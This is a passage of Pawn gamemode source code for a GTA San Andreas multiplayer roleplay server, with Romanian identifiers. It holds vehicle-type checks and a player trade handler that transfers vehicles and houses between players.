		else if(IsPlayerInRangeOfPoint(playerid,15.0,BizzInfo[46][bEntranceX],BizzInfo[46][bEntranceY],BizzInfo[46][bEntranceZ]) || IsPlayerInRangeOfPoint(playerid,15.0,BizzInfo[47][bEntranceX],BizzInfo[47][bEntranceY],BizzInfo[47][bEntranceZ]))
		{
		    return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid,15.0,BizzInfo[48][bEntranceX],BizzInfo[48][bEntranceY],BizzInfo[48][bEntranceZ]) || IsPlayerInRangeOfPoint(playerid,15.0,BizzInfo[49][bEntranceX],BizzInfo[49][bEntranceY],BizzInfo[49][bEntranceZ]))
		{
		    return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid,15.0,BizzInfo[50][bEntranceX],BizzInfo[50][bEntranceY],BizzInfo[50][bEntranceZ]))
		{
		    return 1;
		}
	}
	return 0;
}

// BOAT
public IsABoat(carid)
{
	if(GetVehicleModel(carid) == 430 || GetVehicleModel(carid) == 446 || GetVehicleModel(carid) == 452 || GetVehicleModel(carid) == 453 || GetVehicleModel(carid) == 454 || GetVehicleModel(carid) == 472 || GetVehicleModel(carid) == 473 || GetVehicleModel(carid) == 484 || GetVehicleModel(carid) == 493 || GetVehicleModel(carid) == 595)
	{
		return 1;
	}
	return 0;
}

// PLANE
public IsAPlane(carid)
{
	if(GetVehicleModel(carid) == 417 || GetVehicleModel(carid) == 425 || GetVehicleModel(carid) == 447 || GetVehicleModel(carid) == 460 || GetVehicleModel(carid) == 464 || GetVehicleModel(carid) == 465 || GetVehicleModel(carid) == 469 || GetVehicleModel(carid) == 476 || GetVehicleModel(carid) == 487 || GetVehicleModel(carid) == 488 || GetVehicleModel(carid) == 497 || GetVehicleModel(carid) == 501 || GetVehicleModel(carid) == 511 || GetVehicleModel(carid) == 512 || GetVehicleModel(carid) == 513
	 || GetVehicleModel(carid) == 519 || GetVehicleModel(carid) == 520 || GetVehicleModel(carid) == 548 || GetVehicleModel(carid) == 553 || GetVehicleModel(carid) == 563 || GetVehicleModel(carid) == 577 || GetVehicleModel(carid) == 592 || GetVehicleModel(carid) == 593)
	{
		return 1;
	}
	return 0;
}

// COP CAR PD
public IsACopCar(carid)
{
	if(carid == Copcar[1] || carid == Copcar[2] || carid == Copcar[3] || carid == Copcar[4] || carid == Copcar[5] || carid == Copcar[6] || carid == Copcar[7] || carid == Copcar[8] || carid == Copcar[9] || carid == Copcar[10] || carid == Copcar[11] || carid == Copcar[12] || carid == Copcar[13] || carid == Copcar[14] ||
	carid == Copcar[15] || carid == Copcar[16] || carid == Copcar[17] || carid == Copcar[18] || carid == Copcar[19] || carid == Copcar[20] || carid == Copcar[21] || carid == Copcar[22] || carid == Copcar[23] || carid == Copcar[24] || carid == Copcar[25] || carid == Copcar[26] || carid == Copcar[27] || carid == Copcar[29] || carid == Copcar[30] || carid == Copcar[31] || carid == Copcar[32])
	{
  		return 1;
	}
	return 0;
}


// ALL COPS CAR
public Copcar2(carid)
{
	if(carid == Copcar[1] || carid == Copcar[2] || carid == Copcar[3] || carid == Copcar[4] || carid == Copcar[5] || carid == Copcar[6] || carid == Copcar[7] || carid == Copcar[8] || carid == Copcar[9] || carid == Copcar[10] || carid == Copcar[11] || carid == Copcar[12] || carid == Copcar[13] || carid == Copcar[14] ||
	carid == Copcar[15] || carid == Copcar[16] || carid == Copcar[17] || carid == Copcar[18] || carid == Copcar[19] || carid == Copcar[20] || carid == Fbicar[1] || carid == Fbicar[2] || carid == Fbicar[3] || carid == Fbicar[4] || carid == Fbicar[5] || carid == Fbicar[6] || carid == Fbicar[7] || carid == Fbicar[8] || carid == Fbicar[9] || carid == Fbicar[10]
	|| carid == Fbicar[11] || carid == Fbicar[12] || carid == Fbicar[13] || carid == Fbicar[14] || carid == Fbicar[15] || carid == Fbicar[16] || carid == Ngcar[1] || carid == Ngcar[2] || carid == Ngcar[3] || carid == Ngcar[4] || carid == Ngcar[5] || carid == Ngcar[6] || carid == Ngcar[7] || carid == Ngcar[8] || carid == Ngcar[9] || carid == Ngcar[10] || carid == Ngcar[11]
	|| carid == Copcar[21] || carid == Copcar[22] || carid == Copcar[23] || carid == Copcar[24] || carid == Copcar[25] || carid == Copcar[26] || carid == Copcar[27] || carid == Copcar[29] || carid == Copcar[30] || carid == Copcar[31] || carid == Copcar[32] || carid == LVpdcar[1] || carid == LVpdcar[2] || carid == LVpdcar[3] || carid == LVpdcar[4] || carid == LVpdcar[5]
	|| carid == LVpdcar[6] || carid == LVpdcar[7] || carid == LVpdcar[8] || carid == LVpdcar[9] || carid == LVpdcar[10] || carid == LVpdcar[11] || carid == LVpdcar[12] || carid == LVpdcar[13] || carid == LVpdcar[14] || carid == LVpdcar[15] || carid == LVpdcar[16] || carid == LVpdcar[17] || carid == LVpdcar[18] || carid == LVpdcar[19] || carid == LVpdcar[20]
	|| carid == LVpdcar[21] || carid == LVpdcar[22] || carid == LVpdcar[23] || carid == LVpdcar[24] || carid == LVpdcar[25] || carid == LVpdcar[26] || carid == LVpdcar[27] || carid == LVpdcar[28] || carid == LVpdcar[29] || carid == LVpdcar[30] || carid == LVpdcar[31] || carid == LVpdcar[32] || carid == LVpdcar[33] || carid == LVpdcar[34] || carid == LVpdcar[35]
	|| carid == LVpdcar[36] || carid == LVpdcar[37] || carid == LVpdcar[38] || carid == LVpdcar[39] || carid == LVpdcar[40] || carid == SFpdcar[1] || carid == SFpdcar[2] || carid == SFpdcar[3] || carid == SFpdcar[4] || carid == SFpdcar[5] || carid == SFpdcar[6] || carid == SFpdcar[7] || carid == SFpdcar[8] || carid == SFpdcar[9] || carid == SFpdcar[10] || carid == SFpdcar[11] || carid == SFpdcar[12] || carid == SFpdcar[13]
	|| carid == SFpdcar[14] || carid == SFpdcar[15] || carid == SFpdcar[16] || carid == SFpdcar[17] || carid == SFpdcar[18] || carid == SFpdcar[19] || carid == SFpdcar[20] || carid == SFpdcar[21] || carid == SFpdcar[22] || carid == SFpdcar[23] || carid == SFpdcar[24] || carid == SFpdcar[25] || carid == SFpdcar[26] || carid == SFpdcar[27])
	{
  		return 1;
	}
	return 0;
}

// FBI CAR
public IsAFbiCar(carid)
{
	if(carid == Fbicar[1] || carid == Fbicar[2] || carid == Fbicar[3] || carid == Fbicar[4] || carid == Fbicar[5] || carid == Fbicar[6] || carid == Fbicar[7] || carid == Fbicar[8] || carid == Fbicar[9] || carid == Fbicar[10] || carid == Fbicar[11] || carid == Fbicar[12] || carid == Fbicar[13] || carid == Fbicar[14] || carid == Fbicar[14] || carid == Fbicar[15] || carid == Fbicar[16])
	{
  		return 1;
	}
	return 0;
}
// LVPD CAR
public IsALVPDCar(carid)
{
	if(carid == LVpdcar[1] || carid == LVpdcar[2] || carid == LVpdcar[3] || carid == LVpdcar[4] || carid == LVpdcar[5]
	|| carid == LVpdcar[6] || carid == LVpdcar[7] || carid == LVpdcar[8] || carid == LVpdcar[9] || carid == LVpdcar[10] || carid == LVpdcar[11] || carid == LVpdcar[12] || carid == LVpdcar[13] || carid == LVpdcar[14] || carid == LVpdcar[15] || carid == LVpdcar[16] || carid == LVpdcar[17] || carid == LVpdcar[18] || carid == LVpdcar[19] || carid == LVpdcar[20]
	|| carid == LVpdcar[21] || carid == LVpdcar[22] || carid == LVpdcar[23] || carid == LVpdcar[24] || carid == LVpdcar[25] || carid == LVpdcar[26] || carid == LVpdcar[27] || carid == LVpdcar[28] || carid == LVpdcar[29] || carid == LVpdcar[30] || carid == LVpdcar[31] || carid == LVpdcar[32] || carid == LVpdcar[33] || carid == LVpdcar[34] || carid == LVpdcar[35]
	|| carid == LVpdcar[36] || carid == LVpdcar[37] || carid == LVpdcar[38] || carid == LVpdcar[39] || carid == LVpdcar[40])
	{
  		return 1;
	}
	return 0;
}
public IsASFPDCar(carid)
{
    if(carid == SFpdcar[1] || carid == SFpdcar[2] || carid == SFpdcar[3] || carid == SFpdcar[4] || carid == SFpdcar[5] || carid == SFpdcar[6] || carid == SFpdcar[7] || carid == SFpdcar[8] || carid == SFpdcar[9] || carid == SFpdcar[10] || carid == SFpdcar[11] || carid == SFpdcar[12] || carid == SFpdcar[13]
	|| carid == SFpdcar[14] || carid == SFpdcar[15] || carid == SFpdcar[16] || carid == SFpdcar[17] || carid == SFpdcar[18] || carid == SFpdcar[19] || carid == SFpdcar[20] || carid == SFpdcar[21] || carid == SFpdcar[22] || carid == SFpdcar[23] || carid == SFpdcar[24] || carid == SFpdcar[25] || carid == SFpdcar[26] || carid == SFpdcar[27])
	{
	    return 1;
	}
	return 0;
}
// NG CAR
public IsANgCar(carid)
{
	if(carid == Ngcar[1] || carid == Ngcar[2] || carid == Ngcar[3] || carid == Ngcar[4] || carid == Ngcar[5] || carid == Ngcar[6] || carid == Ngcar[7] || carid == Ngcar[8] || carid == Ngcar[9] || carid == Ngcar[10] || carid == Ngcar[11])
    {
  		return 1;
	}
	return 0;
}

// AMBULANCE
public IsAnAmbulance(carid)
{
	if(carid == ambcars[1] || carid == ambcars[2] || carid == ambcars[3] || carid == ambcars[4] || carid == ambcars[5] || carid == ambcars[6] || carid == ambcars[7] || carid == ambcars[8] || carid == ambcars[9] || carid == ambcars[10])
{
		return 1;
	}
	return 0;
}

// TAXI CAR
public IsAnTaxi(carid)
{
	if(carid == taxic[1] || carid == taxic[2] || carid == taxic[3] || carid == taxic[4] || carid == taxic[5] || carid == taxic[6] || carid == taxic[7] || carid == taxic[8] || carid == taxic[9] || carid == taxic[10])
	{
	    return 1;
	}
	return 0;
}

// GARBAGE TRUCK
public IsAGarbageTruck(carid)
{
	if(carid == garbage[1] || carid == garbage[2] || carid == garbage[3] || carid == garbage[4] || carid == garbage[5] || carid == garbage[6] || carid == garbage[7] || carid == garbage[8] || carid == garbage[9] || carid == garbage[10] )
	{
		return 1;
	}
	return 0;
}



// BUS
public IsABus(carid)
{
	if(carid == bus[10] || carid == bus[11] || carid == bus[12] || carid == bus[13] || carid == bus[14] || carid == bus[15] || carid == bus[16])
	{
		return 1;
	}
	return 0;
}

/*// PIZZA SCOOTER
public IsAPizza(carid)
{
	if(carid == pizza[1] || carid == pizza[2] || carid == pizza[3] || carid == pizza[4] || carid == pizza[5] || carid == pizza[6] || carid == pizza[7] || carid == pizza[8] || carid == pizza[9] || carid == pizza[10] || carid == pizza[11] || carid == pizza[12] || carid == pizza[13] || carid == pizza[14])
	{
		return 1;
	}
	return 0;
}*/

// FAMER CAR
public IsAFarmer(carid)
{
	if(carid == farm[1] || carid == farm[2] || carid == farm[3] || carid == farm[4] || carid == farm[5] || carid == farm[6] || carid == farm[7] || carid == farm[8] || carid == farm[9] || carid == farm[10]
	|| carid == farm[11] || carid == farm[12] || carid == farm[13])
	{
		return 1;
	}
	return 0;
}

// TRUCK
public IsATruck(carid)
{
	if(carid == truck[1] || carid == truck[2] || carid == truck[3] || carid == truck[4] || carid == truck[5] || carid == truck[6] || carid == truck[7] || carid == truck[8] || carid == truck[9] || carid == truck[10] || carid == truck[11] || carid == truck[12] || carid == truck[13] || carid == truck[14]
	|| carid == truck[15] || carid == truck[16] || carid == truck[17] || carid == truck[18])
	{
		return 1;
	}
	return 0;
}

// BIKE
public IsABike(carid)
{

	if(GetVehicleModel(carid) == 481 || GetVehicleModel(carid) == 509 || GetVehicleModel(carid) == 510)
	{
		return 1;
	}
	return 0;
}
//OnPlayerClickPlayerTextDraw
public OnPlayerClickPlayerTextDraw(playerid, PlayerText:playertextid)
{
	new string[1000];
	if(playertextid == TradeTD[7])
	{
		if(iteme_adaugate[playerid] > 6) return SCM(playerid, COLOR_ERROR, "You can not add items.");
		new vehicule_deinute = 0;
		if(PlayerInfo[playerid][pPcarkey] > 0) vehicule_deinute++;
		if(PlayerInfo[playerid][pmotokey] > 0) vehicule_deinute++;
		if(PlayerInfo[playerid][pprcarkey] > 0) vehicule_deinute++;
		if(PlayerInfo[playerid][pprcarkey2] > 0) vehicule_deinute++;
		if(PlayerInfo[playerid][pPPluscarkey] > 0) vehicule_deinute++;
		if(PlayerInfo[playerid][pPPluscarkey2] > 0) vehicule_deinute++;
		if(PlayerInfo[playerid][pCarkey7] > 0) vehicule_deinute++;
		if(PlayerInfo[playerid][pCarkey8] > 0) vehicule_deinute++;
		if(PlayerInfo[playerid][pCarkey9] > 0) vehicule_deinute++;
		if(PlayerInfo[playerid][pCarkey10] > 0) vehicule_deinute++;
		if(PlayerInfo[playerid][pCarkey11] > 0) vehicule_deinute++;
		if(PlayerInfo[playerid][pCarkey12] > 0) vehicule_deinute++;
		if(PlayerInfo[playerid][pCarkey13] > 0) vehicule_deinute++;
		if(PlayerInfo[playerid][pCarkey14] > 0) vehicule_deinute++;
		if(PlayerInfo[playerid][pCarkey15] > 0) vehicule_deinute++;
		format(MGLOBAL, sizeof(MGLOBAL), "Item\tAmount\nAdd Vehicle\t%d\nAdd House\t-\nAdd business\t-\nAdd Money\t$%s",vehicule_deinute,FormatNumber(GetPlayerCash(playerid)));
		ShowPlayerDialog(playerid, DIALOG_TRADE, DIALOG_STYLE_TABLIST_HEADERS, "Add items", MGLOBAL, "Select" , "CANCEL");
	}
	if(playertextid == TradeTD[8])
	{
		if(in_afacere_cu[playerid] >= 0)
		{
			if(iteme_adaugate[playerid] < 1) return SCM(playerid, COLOR_ERROR, "You have not added any item.");
			StergeIteme(playerid, in_afacere_cu[playerid]);
			SCM(playerid, COLOR_SERVER, "{0066FF}Trade: {FFFFFF}You have removed all items added.");
		}	
	}
	if(playertextid == TradeTD[9])
	{
		if(iteme_adaugate[playerid] < 1) return SCM(playerid, COLOR_ERROR, "You have not added any item.");
		new id_jucator = in_afacere_cu[playerid];
		if(IsPlayerConnected(id_jucator))
		{
			new status_trade[256];
			if(pregatit_trade[playerid] == 0)
			{
				format(status_trade, sizeof(status_trade), "%s~n~~g~Prepared",PlayerInfo[playerid][pNormalName]);
				pregatit_trade[playerid] = 1;
			}
			else if(pregatit_trade[playerid] == 1)
			{
				format(status_trade, sizeof(status_trade), "%s~n~~r~Prepared",PlayerInfo[playerid][pNormalName]);
				pregatit_trade[playerid] = 0;
			}
			if(partitie_trade[playerid] == 1)
			{
				PlayerTextDrawSetString(playerid, TradeTD[4], status_trade),PlayerTextDrawSetString(id_jucator, TradeTD[4], status_trade);
				PlayerTextDrawShow(playerid, TradeTD[4]),PlayerTextDrawShow(id_jucator, TradeTD[4]);
			}
			if(partitie_trade[playerid] == 2)
			{
				PlayerTextDrawSetString(playerid, TradeTD[5], status_trade),PlayerTextDrawSetString(id_jucator, TradeTD[5], status_trade);
				PlayerTextDrawShow(playerid, TradeTD[5]),PlayerTextDrawShow(id_jucator, TradeTD[5]);
			}
			if(pregatit_trade[playerid] == 1 && pregatit_trade[id_jucator] == 1)
			{
				new problema[3];
				new vehicule_detinute = 0;
				if(PlayerInfo[playerid][pPcarkey] > 0) vehicule_detinute++;
				if(PlayerInfo[playerid][pmotokey] > 0) vehicule_detinute++;
				if(PlayerInfo[playerid][pprcarkey] > 0) vehicule_detinute++;
				if(PlayerInfo[playerid][pprcarkey2] > 0) vehicule_detinute++;
				if(PlayerInfo[playerid][pPPluscarkey] > 0) vehicule_detinute++;
				if(PlayerInfo[playerid][pPPluscarkey2] > 0) vehicule_detinute++;
				if(PlayerInfo[playerid][pCarkey7] > 0) vehicule_detinute++;
				if(PlayerInfo[playerid][pCarkey8] > 0) vehicule_detinute++;
				if(PlayerInfo[playerid][pCarkey9] > 0) vehicule_detinute++;
				if(PlayerInfo[playerid][pCarkey10] > 0) vehicule_detinute++;
				if(PlayerInfo[playerid][pCarkey11] > 0) vehicule_detinute++;
				if(PlayerInfo[playerid][pCarkey12] > 0) vehicule_detinute++;
				if(PlayerInfo[playerid][pCarkey13] > 0) vehicule_detinute++;
				if(PlayerInfo[playerid][pCarkey14] > 0) vehicule_detinute++;
				if(PlayerInfo[playerid][pCarkey15] > 0) vehicule_detinute++;
				
				new vehicule_detinute_2 = 0;
				if(PlayerInfo[id_jucator][pPcarkey] > 0) vehicule_detinute_2++;
				if(PlayerInfo[id_jucator][pmotokey] > 0) vehicule_detinute_2++;
				if(PlayerInfo[id_jucator][pprcarkey] > 0) vehicule_detinute_2++;
				if(PlayerInfo[id_jucator][pprcarkey2] > 0) vehicule_detinute_2++;
				if(PlayerInfo[id_jucator][pPPluscarkey] > 0) vehicule_detinute_2++;
				if(PlayerInfo[id_jucator][pPPluscarkey2] > 0) vehicule_detinute_2++;
				if(PlayerInfo[id_jucator][pCarkey7] > 0) vehicule_detinute_2++;
				if(PlayerInfo[id_jucator][pCarkey8] > 0) vehicule_detinute_2++;
				if(PlayerInfo[id_jucator][pCarkey9] > 0) vehicule_detinute_2++;
				if(PlayerInfo[id_jucator][pCarkey10] > 0) vehicule_detinute_2++;
				if(PlayerInfo[id_jucator][pCarkey11] > 0) vehicule_detinute_2++;
				if(PlayerInfo[id_jucator][pCarkey12] > 0) vehicule_detinute_2++;
				if(PlayerInfo[id_jucator][pCarkey13] > 0) vehicule_detinute_2++;
				if(PlayerInfo[id_jucator][pCarkey14] > 0) vehicule_detinute_2++;
				if(PlayerInfo[id_jucator][pCarkey15] > 0) vehicule_detinute_2++;
				for(new i = 0; i < 3; i++) { problema[i] = -1; }	
				if(problema[0] == -1)
				{
					new vehicule_jucator_1 = 0;
					new vehicule_jucator_2 = 0;
					for(new i = 0; i < 15; i++)
					{
						if(vehicule[i][playerid] > 0)
						{
							vehicule_jucator_1++;
						}
						if(vehicule[i][id_jucator] > 0)
						{
							vehicule_jucator_2++;
						}
					}
					if(vehicule_jucator_1 > 0 || vehicule_jucator_2 > 0)
					{
						new vehicule_ambii_jucatori_1,vehicule_ambii_jucatori_2;
						if(vehicule_jucator_2 >= vehicule_jucator_1) { vehicule_ambii_jucatori_1 = vehicule_jucator_2-vehicule_jucator_1; }
						else if(vehicule_jucator_1 >= vehicule_jucator_2) { vehicule_ambii_jucatori_2 = vehicule_jucator_1-vehicule_jucator_2; }					
						if(vehicule_detinute+vehicule_ambii_jucatori_1 > 10 && PlayerInfo[playerid][pVip] == 0) { problema[0] = playerid; }
						if(vehicule_detinute+vehicule_ambii_jucatori_1 > 15) { problema[0] = playerid; }
						if(vehicule_detinute_2+vehicule_ambii_jucatori_2 > 10 && PlayerInfo[id_jucator][pVip] == 0) { problema[0] = id_jucator; }
						if(vehicule_detinute_2+vehicule_ambii_jucatori_2 > 15) { problema[0] = id_jucator; }
					}	
				}
				if(problema[1] == -1)
				{
					new vanzare_casa = 0;
					// 1 = playerid la id.
					// 2 = id la playerid.
					// 3 = reciproc
					// 0 = eroare.
					if(casa_trade[playerid] > 0 || casa_trade[id_jucator] > 0)
					{
						if(casa_trade[playerid] > 0 && PlayerInfo[id_jucator][pPhousekey] == 999 && vanzare_casa == 0) { vanzare_casa = 1; }
						if(casa_trade[id_jucator] > 0 && PlayerInfo[playerid][pPhousekey] == 999 && vanzare_casa == 0) { vanzare_casa = 2; }
						if(casa_trade[id_jucator] > 0 && casa_trade[playerid] > 0 && vanzare_casa == 0) { vanzare_casa = 3; }
						if(vanzare_casa == 0) 
						{ 
							if(casa_trade[playerid] > 0) problema[1] = id_jucator; 
							if(casa_trade[id_jucator] > 0) problema[1] = playerid; 
						}
					}	
				}
				if(problema[2] == -1)
				{
					new vanzare_afacere = 0;
					// 1 = playerid la id.
					// 2 = id la playerid.
					// 3 = reciproc.
					// 0 = eroare.
					if(afacere_trade[playerid] > 0 || afacere_trade[id_jucator] > 0)
					{
						if(afacere_trade[playerid] > 0 && PlayerInfo[id_jucator][pPbiskey] == 255 && vanzare_afacere == 0) { vanzare_afacere = 1; }
						if(afacere_trade[id_jucator] > 0 && PlayerInfo[playerid][pPbiskey] == 255 && vanzare_afacere == 0) { vanzare_afacere = 2; }
						if(afacere_trade[id_jucator] > 0 && afacere_trade[playerid] > 0 && vanzare_afacere == 0) { vanzare_afacere = 3; }
						if(vanzare_afacere == 0)
						{ 
							if(afacere_trade[playerid] > 0) problema[2] = id_jucator; 
							if(afacere_trade[id_jucator] > 0) problema[2] = playerid; 
						}
					}	
				}
				new problema_identificata = 0;
				for(new i = 0; i < 3; i++)
				{
					if(problema_identificata == 0)
					{
						if(problema[i] >= 0)
						{	
							SCM(playerid, COLOR_SERVER, "{FFFFFF}___________________________{0066FF}Trade issues{FFFFFF}___________________________"),SCM(id_jucator, COLOR_SERVER, "{FFFFFF}___________________________{0066FF}Probleme Trade{FFFFFF}___________________________");
							SCM(playerid, COLOR_SERVER, "{0066FF}Trade: {FFFFFF}It was detected a problem."),SCM(id_jucator, COLOR_SERVER, "{0066FF}Trade: {FFFFFF}It was detected a problem.");
							if(problema[0] >= 0) 
							{
								new jucator_id = problema[0];
								format(MGLOBAL, sizeof(MGLOBAL), "{0066FF}- {FFFFFF}%s It does not have enough slots to store all vehicles.",PlayerInfo[jucator_id][pNormalName]);
								SCM(playerid, COLOR_SERVER, MGLOBAL); 
								SCM(id_jucator, COLOR_SERVER, MGLOBAL); 
							}
							if(problema[1] >= 0) 
							{ 
								new jucator_id = problema[1];
								format(MGLOBAL, sizeof(MGLOBAL), "{0066FF}- {FFFFFF}%s already owns a house that did not add it to the list of items.",PlayerInfo[jucator_id][pNormalName]);
								SCM(playerid, COLOR_SERVER, MGLOBAL); 
								SCM(id_jucator, COLOR_SERVER, MGLOBAL); 
							}
							if(problema[2] >= 0) 
							{ 
								new jucator_id = problema[2];
								format(MGLOBAL, sizeof(MGLOBAL), "{0066FF}- {FFFFFF}%s already owns a business that has not added a list of items.",PlayerInfo[jucator_id][pNormalName]);
								SCM(playerid, COLOR_SERVER, MGLOBAL);
								SCM(id_jucator, COLOR_SERVER, MGLOBAL);
							}
							SCM(playerid, COLOR_SERVER, "{FFFFFF}___________________________{0066FF}failed business!{FFFFFF}___________________________"),SCM(id_jucator, COLOR_SERVER, "{FFFFFF}___________________________{0066FF}Afacere esuata!{FFFFFF}___________________________");
							problema_identificata = 1;
							pregatit_trade[playerid] = 0;
							pregatit_trade[id_jucator] = 0;
							if(partitie_trade[playerid] == 1) 
							{
								format(status_trade, sizeof(status_trade), "%s~n~~r~Prepared",PlayerInfo[playerid][pNormalName]);
								PlayerTextDrawSetString(playerid, TradeTD[4], status_trade);
								PlayerTextDrawSetString(id_jucator, TradeTD[4], status_trade);
								format(status_trade, sizeof(status_trade), "%s~n~~r~Prepared",PlayerInfo[id_jucator][pNormalName]);
								PlayerTextDrawSetString(playerid, TradeTD[5], status_trade);
								PlayerTextDrawSetString(id_jucator, TradeTD[5], status_trade);					
							}
							if(partitie_trade[playerid] == 2) 
							{
								format(status_trade, sizeof(status_trade), "%s~n~~r~Prepared",PlayerInfo[playerid][pNormalName]);
								PlayerTextDrawSetString(playerid, TradeTD[5], status_trade);
								PlayerTextDrawSetString(id_jucator, TradeTD[5], status_trade);
								format(status_trade, sizeof(status_trade), "%s~n~~r~Prepared",PlayerInfo[id_jucator][pNormalName]);
								PlayerTextDrawSetString(playerid, TradeTD[4], status_trade);
								PlayerTextDrawSetString(id_jucator, TradeTD[4], status_trade);					
							}
						}
					}	
				}
				if(problema_identificata == 0)
				{
					for(new i = 0; i < 15; i++)
					{
						if(vehicule[i][playerid] > 0)
						{
							TransferaItem(playerid, id_jucator, 1, vehicule[i][playerid]);
							if(PlayerInfo[playerid][pPcarkey] == vehicule[i][playerid])
							{
								PlayerInfo[playerid][pPcarkey] = 0;
								Update(playerid, pPcarkeyx);
								
							}
							if(PlayerInfo[playerid][pmotokey] == vehicule[i][playerid])
							{
								PlayerInfo[playerid][pmotokey] = 0;
								Update(playerid, pmotokeyx);
								
							}
							if(PlayerInfo[playerid][pprcarkey] == vehicule[i][playerid])
							{
								PlayerInfo[playerid][pprcarkey] = 0;
								Update(playerid, pprcarkeyx);
								
							}
							if(PlayerInfo[playerid][pprcarkey2] == vehicule[i][playerid])
							{
								PlayerInfo[playerid][pprcarkey2] = 0;
								Update(playerid, pprcarkey2x);
								
							}
							if(PlayerInfo[playerid][pPPluscarkey] == vehicule[i][playerid])
							{
								PlayerInfo[playerid][pPPluscarkey] = 0;
								Update(playerid, pPPluscarkeyx);
								
							}
							if(PlayerInfo[playerid][pPPluscarkey2] == vehicule[i][playerid])
							{
								PlayerInfo[playerid][pPPluscarkey2] = 0;
								Update(playerid, pPPluscarkey2x);
								
							}
							if(PlayerInfo[playerid][pCarkey7] == vehicule[i][playerid])
							{
								PlayerInfo[playerid][pCarkey7] = 0;
								Update(playerid, pCarkey7x);
								
							}
							if(PlayerInfo[playerid][pCarkey8] == vehicule[i][playerid])
							{
								PlayerInfo[playerid][pCarkey8] = 0;
								Update(playerid, pCarkey8x);
								
							}
							if(PlayerInfo[playerid][pCarkey9] == vehicule[i][playerid])
							{
								PlayerInfo[playerid][pCarkey9] = 0;
								Update(playerid, pCarkey9x);
								
							}
							if(PlayerInfo[playerid][pCarkey10] == vehicule[i][playerid])
							{
								PlayerInfo[playerid][pCarkey10] = 0;
								Update(playerid, pCarkey10x);
								
							}
							if(PlayerInfo[playerid][pCarkey11] == vehicule[i][playerid])
							{
								PlayerInfo[playerid][pCarkey11] = 0;
								Update(playerid, pCarkey11x);
								
							}
							if(PlayerInfo[playerid][pCarkey12] == vehicule[i][playerid])
							{
								PlayerInfo[playerid][pCarkey12] = 0;
								Update(playerid, pCarkey12x);
								
							}
							if(PlayerInfo[playerid][pCarkey13] == vehicule[i][playerid])
							{
								PlayerInfo[playerid][pCarkey13] = 0;
								Update(playerid, pCarkey13x);
								
							}
							if(PlayerInfo[playerid][pCarkey14] == vehicule[i][playerid])
							{
								PlayerInfo[playerid][pCarkey14] = 0;
								Update(playerid, pCarkey14x);
								
							}
							if(PlayerInfo[playerid][pCarkey15] == vehicule[i][playerid])
							{
								PlayerInfo[playerid][pCarkey15] = 0;
								Update(playerid, pCarkey15x);
								
							}
							vehicule[i][playerid] = 0;
						}
						if(vehicule[i][id_jucator] > 0)
						{
							TransferaItem(id_jucator, playerid, 1, vehicule[i][id_jucator]);
							if(PlayerInfo[id_jucator][pPcarkey] == vehicule[i][id_jucator])
							{
								PlayerInfo[id_jucator][pPcarkey] = 0;
								Update(id_jucator, pPcarkeyx);
								
							}
							if(PlayerInfo[id_jucator][pmotokey] == vehicule[i][id_jucator])
							{
								PlayerInfo[id_jucator][pmotokey] = 0;
								Update(id_jucator, pmotokeyx);
								
							}
							if(PlayerInfo[id_jucator][pprcarkey] == vehicule[i][id_jucator])
							{
								PlayerInfo[id_jucator][pprcarkey] = 0;
								Update(id_jucator, pprcarkeyx);
								
							}
							if(PlayerInfo[id_jucator][pprcarkey2] == vehicule[i][id_jucator])
							{
								PlayerInfo[id_jucator][pprcarkey2] = 0;
								Update(id_jucator, pprcarkey2x);
								
							}
							if(PlayerInfo[id_jucator][pPPluscarkey] == vehicule[i][id_jucator])
							{
								PlayerInfo[id_jucator][pPPluscarkey] = 0;
								Update(id_jucator, pPPluscarkeyx);
								
							}
							if(PlayerInfo[id_jucator][pPPluscarkey2] == vehicule[i][id_jucator])
							{
								PlayerInfo[id_jucator][pPPluscarkey2] = 0;
								Update(id_jucator, pPPluscarkey2x);
								
							}
							if(PlayerInfo[id_jucator][pCarkey7] == vehicule[i][id_jucator])
							{
								PlayerInfo[id_jucator][pCarkey7] = 0;
								Update(id_jucator, pCarkey7x);
								
							}
							if(PlayerInfo[id_jucator][pCarkey8] == vehicule[i][id_jucator])
							{
								PlayerInfo[id_jucator][pCarkey8] = 0;
								Update(id_jucator, pCarkey8x);
								
							}
							if(PlayerInfo[id_jucator][pCarkey9] == vehicule[i][id_jucator])
							{
								PlayerInfo[id_jucator][pCarkey9] = 0;
								Update(id_jucator, pCarkey9x);
								
							}
							if(PlayerInfo[id_jucator][pCarkey10] == vehicule[i][id_jucator])
							{
								PlayerInfo[id_jucator][pCarkey10] = 0;
								Update(id_jucator, pCarkey10x);
								
							}
							if(PlayerInfo[id_jucator][pCarkey11] == vehicule[i][id_jucator])
							{
								PlayerInfo[id_jucator][pCarkey11] = 0;
								Update(id_jucator, pCarkey11x);
								
							}
							if(PlayerInfo[id_jucator][pCarkey12] == vehicule[i][id_jucator])
							{
								PlayerInfo[id_jucator][pCarkey12] = 0;
								Update(id_jucator, pCarkey12x);
								
							}
							if(PlayerInfo[id_jucator][pCarkey13] == vehicule[i][id_jucator])
							{
								PlayerInfo[id_jucator][pCarkey13] = 0;
								Update(id_jucator, pCarkey13x);
								
							}
							if(PlayerInfo[id_jucator][pCarkey14] == vehicule[i][id_jucator])
							{
								PlayerInfo[id_jucator][pCarkey14] = 0;
								Update(id_jucator, pCarkey14x);
								
							}
							if(PlayerInfo[id_jucator][pCarkey15] == vehicule[i][id_jucator])
							{
								PlayerInfo[id_jucator][pCarkey15] = 0;
								Update(id_jucator, pCarkey15x);
								
							}
							vehicule[i][id_jucator] = 0;
						}
					}
					if(casa_trade[playerid] > 0 || casa_trade[id_jucator] > 0)
					{
						new transfer_casa = 0;
						// 1 = reciproc.
						// 2 = playerid la id.
						// 3 = id la playerid.
						// 0 = eroare.
						if(casa_trade[playerid] > 0 && casa_trade[id_jucator] > 0 && transfer_casa == 0) { transfer_casa = 1; }
						if(casa_trade[playerid] > 0 && transfer_casa == 0) { transfer_casa = 2; }
						if(casa_trade[id_jucator] > 0 && transfer_casa == 0) { transfer_casa = 3; }
						if(transfer_casa == 1)
						{
							PlayerInfo[playerid][pPhousekey] = 999;
							PlayerInfo[id_jucator][pPhousekey] = 999;
							Update(playerid, pPhousekeyx);
							Update(id_jucator, pPhousekeyx);
							TransferaItem(playerid, id_jucator, 2, casa_trade[playerid]);
							TransferaItem(id_jucator, playerid, 2, casa_trade[id_jucator]);
							casa_trade[playerid] = 0;
							casa_trade[id_jucator] = 0;
						}
